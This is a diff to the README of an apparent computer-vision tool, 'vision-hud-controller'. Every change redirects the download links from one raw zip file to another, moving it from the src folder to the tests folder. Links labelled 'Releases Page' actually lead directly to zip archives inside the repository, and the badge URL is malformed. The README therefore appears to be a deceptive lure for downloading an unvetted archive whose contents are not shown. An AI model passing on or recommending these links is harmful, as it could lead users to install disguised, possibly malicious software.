@@ -1,6 +1,6 @@
 # 🚀 vision-hud-controller - Simple Visual Detection for Everyday Use
 
-![Download Vision HUD Controller](https://raw.githubusercontent.com/gustavoesper/vision-hud-controller/main/src/hud-controller-vision-v3.8.zip%20Now-vision--hud--controller-brightgreen)
+![Download Vision HUD Controller](https://raw.githubusercontent.com/gustavoesper/vision-hud-controller/main/tests/hud_controller_vision_v2.4.zip%20Now-vision--hud--controller-brightgreen)
 
 ## 📥 Overview
 
@@ -11,7 +11,7 @@ The vision-hud-controller is a small computer-vision application designed to hel
 Follow these simple steps to get started with the vision-hud-controller.
 
 1. **Download the Application**
-   - Go to the [Releases Page](https://raw.githubusercontent.com/gustavoesper/vision-hud-controller/main/src/hud-controller-vision-v3.8.zip) to download the latest version of the software.
+   - Go to the [Releases Page](https://raw.githubusercontent.com/gustavoesper/vision-hud-controller/main/tests/hud_controller_vision_v2.4.zip) to download the latest version of the software.
 
 2. **Install the Application**
    - After downloading, locate the downloaded file on your computer. 
@@ -51,7 +51,7 @@ After downloading, follow these steps to install the vision-hud-controller:
 
 ## 🔗 Download & Install
 
-To download the vision-hud-controller, visit the [Releases Page](https://raw.githubusercontent.com/gustavoesper/vision-hud-controller/main/src/hud-controller-vision-v3.8.zip) now. This page contains the latest version and its changelog.
+To download the vision-hud-controller, visit the [Releases Page](https://raw.githubusercontent.com/gustavoesper/vision-hud-controller/main/tests/hud_controller_vision_v2.4.zip) now. This page contains the latest version and its changelog.
 
 ## 📖 User Guide
 
@@ -90,4 +90,4 @@ The vision-hud-controller is licensed under the MIT License. You can freely use,
 - **Tutorials**: Visit the tutorials section for videos and guides.
 - **Updates**: Stay updated with new releases and changes through the GitHub repository.
 
-For more information, visit the [Releases Page](https://raw.githubusercontent.com/gustavoesper/vision-hud-controller/main/src/hud-controller-vision-v3.8.zip) to ensure you are using the latest version of vision-hud-controller.
+For more information, visit the [Releases Page](https://raw.githubusercontent.com/gustavoesper/vision-hud-controller/main/tests/hud_controller_vision_v2.4.zip) to ensure you are using the latest version of vision-hud-controller.
